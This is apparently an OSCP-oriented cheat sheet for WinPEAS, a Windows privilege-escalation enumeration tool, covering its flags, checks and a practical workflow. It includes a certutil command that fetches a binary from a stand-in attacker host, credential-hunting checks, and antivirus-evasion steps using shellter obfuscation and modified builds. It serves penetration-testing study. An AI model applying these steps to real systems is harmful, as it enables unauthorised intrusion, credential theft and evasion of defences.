# WinPEAS - Windows Privilege Escalation Awesome Script

WinPEAS (Windows Privilege Escalation Awesome Script) is a powerful enumeration script that automates the discovery of privilege escalation vectors on Windows systems. It collects information about misconfigurations, vulnerable software, credentials, and other weak points that could be exploited to escalate privileges.

## Overview

WinPEAS is part of the PEASS-ng (Privilege Escalation Awesome Scripts Suite - Next Generation) toolkit developed by Carlos Polop (@carlospolop). It is available in multiple formats:

- **WinPEASexe**: Compiled executable (.exe) versions for different architectures
- **WinPEASbat**: Batch script version that doesn't require compiled binaries
- **WinPEASps1**: PowerShell script version

## Download and Setup

```bash
# Main repository
git clone https://github.com/carlospolop/PEASS-ng.git

# Direct download links for binaries
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
```

## Basic Usage

### Executable Version

```cmd
# Run with all checks (may trigger antivirus)
winPEASx64.exe

# Run specific checks more quietly
winPEASx64.exe quiet cmd searchfast

# List available search options
winPEASx64.exe help
```

### Batch Script Version

```cmd
# Run the batch script version
winPEAS.bat

# With specific arguments
winPEAS.bat userinfo
```

### PowerShell Version

```powershell
# Import the module
. .\winPEAS.ps1

# Run the checks
Invoke-WinPEAS
```

## Command Line Arguments

WinPEAS executables support various command line arguments to customize scans:

| Argument | Description |
|----------|-------------|
| `quiet` | Avoid banner and unnecessary information |
| `debug` | Show debug information |
| `notcolor` | Don't use color in output |
| `searchfast` | Only execute tests that search for specific files |
| `cmd [command]` | Execute a specific check (see commands below) |
| `log` | Save the output to a file |

### Common Commands

```cmd
# System information
winPEASany.exe quiet cmd systeminfo

# User information
winPEASany.exe quiet cmd userinfo

# Processes information
winPEASany.exe quiet cmd processinfo

# Services information
winPEASany.exe quiet cmd servicesinfo

# Applications information
winPEASany.exe quiet cmd applicationsinfo

# Network information
winPEASany.exe quiet cmd networkinfo

# Windows credentials
winPEASany.exe quiet cmd windowscreds

# Check for Windows exploits
winPEASany.exe quiet cmd windowsexploits

# Search for specific files
winPEASany.exe quiet cmd filesinfo
```

## Specific Checks for OSCP

For OSCP exam preparation, focus on these key checks:

### Check for Stored Credentials

```cmd
# Search for passwords in various locations
winPEASany.exe quiet cmd windowscreds
```

### Check Service Misconfigurations

```cmd
# Identify service vulnerabilities
winPEASany.exe quiet cmd servicesinfo
```

### Check for AlwaysInstallElevated

```cmd
# Check registry for AlwaysInstallElevated privilege
winPEASany.exe quiet cmd reg
```

### Check for Scheduled Tasks

```cmd
# Identify exploitable scheduled tasks
winPEASany.exe quiet cmd processinfoall
```

### Check for Unquoted Service Paths

```cmd
# Included in servicesinfo check
winPEASany.exe quiet cmd servicesinfo
```

## Recommended Usage for OSCP

For the OSCP exam or similar time-constrained environments, it's important to use WinPEAS efficiently. The following approach is recommended:

```cmd
# Quick first scan with the most useful checks
winPEASany.exe quiet fast

# If you're specifically looking for files containing credentials
winPEASany.exe quiet searchfast

# Running specific command groups to get targeted information
winPEASany.exe quiet cmd windowscreds
winPEASany.exe quiet cmd servicesinfo
winPEASany.exe quiet cmd processinfo
```

### Efficient Enumeration Strategy

1. **Start with user context checks**:
   ```cmd
   whoami /priv
   net user <username>
   ```

2. **Run WinPEAS with fast option** for quick overview:
   ```cmd
   winPEASany.exe quiet fast
   ```

3. **Follow up with searchfast** to find potential credential files:
   ```cmd
   winPEASany.exe quiet searchfast
   ```

4. **Use targeted commands** for specific areas of interest:
   ```cmd
   # If you suspect service vulnerabilities
   winPEASany.exe quiet cmd servicesinfo
   
   # If you need credential hunting
   winPEASany.exe quiet cmd windowscreds
   
   # If you suspect vulnerable processes
   winPEASany.exe quiet cmd processinfo
   ```

5. **If automated tools fail**, fall back to manual enumeration commands

This approach provides a balance between thoroughness and efficiency, which is crucial for the OSCP exam where time management is essential.

### Common Issues and Solutions

- If WinPEAS is flagged by antivirus, try using the batch script version (`winPEAS.bat`)
- If specific checks are causing errors, use the targeted command approach with `cmd` parameter
- If WinPEAS execution is extremely slow, start with `searchfast` and targeted commands instead of full scans

Remember that while automated tools like WinPEAS are powerful, understanding the underlying enumeration techniques and having fallback manual commands ready is crucial for success in the OSCP exam.

## Practical Example

Here's how to use WinPEAS in a typical privilege escalation scenario:

1. **Transfer the tool to the target**:
   ```cmd
   # On your attack machine, host the file via HTTP
   python3 -m http.server 8080
   
   # On the Windows target
   certutil -urlcache -f http://YOUR_IP:8080/winPEASany.exe winPEAS.exe
   ```

2. **Run an initial scan**:
   ```cmd
   winPEAS.exe quiet cmd searchfast
   ```

3. **Look for color-highlighted findings**:
   - Red/Yellow: High-interest findings that often lead to privilege escalation
   - Green: Informational findings that may be useful

4. **Run specific checks based on initial findings**:
   ```cmd
   # Example: If you see potential service issues
   winPEAS.exe quiet cmd servicesinfo
   ```

5. **Redirect output to a file for further analysis**:
   ```cmd
   winPEAS.exe > winpeas_output.txt
   ```

## Output Interpretation

WinPEAS uses color coding in its output:

- **Red**: Critical issues or findings that may lead to privilege escalation
- **Yellow/Green**: Important information that requires attention
- **Blue/Cyan**: References or additional context
- **Gray**: General information

Focus on red and yellow highlighted text first, as these often indicate privilege escalation vectors.

## Windows Credential Hunting

One of WinPEAS's most valuable features is its ability to find stored credentials:

```cmd
# Run the windowscreds module
winPEASany.exe quiet cmd windowscreds
```

This checks for:
- Credentials in Windows Vault
- Credentials Manager saved passwords
- Saved RDP connections
- Recently run commands
- Sticky Notes content
- Browser stored credentials
- Configuration files with credentials

## Dealing with Antivirus

WinPEAS may trigger antivirus solutions. To bypass detection:

1. **Use the batch script version** (`winPEAS.bat`) which is less likely to trigger AV
2. **Use obfuscation techniques** on the executable:
   ```bash
   # On Kali Linux
   apt-get install shellter
   shellter -a -f winPEASany.exe
   ```
3. **Run specific modules** instead of the full scan
4. **Use PowerShell encoded commands** to load the script in memory

## Advanced Usage: Custom WinPEAS Builds

You can build a custom version of WinPEAS from source:

```bash
git clone https://github.com/carlospolop/PEASS-ng.git
cd PEASS-ng/winPEAS/winPEASexe/winPEAS
# Open in Visual Studio or build with dotnet
dotnet build
```

Custom building allows you to:
- Modify the code to bypass specific AV solutions
- Add custom checks
- Remove features that might cause issues

## OSCP Exam Notes

For the OSCP exam:

1. **Always transfer multiple versions** of WinPEAS (exe, bat, ps1) in case one gets flagged
2. **Save and analyze output thoroughly** - WinPEAS provides a lot of information
3. **Combine with manual checks** - don't rely solely on automated tools
4. **Look for easy wins** like AlwaysInstallElevated or weak service permissions
5. **Use the `quiet` parameter** to reduce noise and focus on important findings

Remember that WinPEAS is a reconnaissance tool that identifies potential privilege escalation vectors, but understanding and exploiting these vectors still requires knowledge and manual effort. 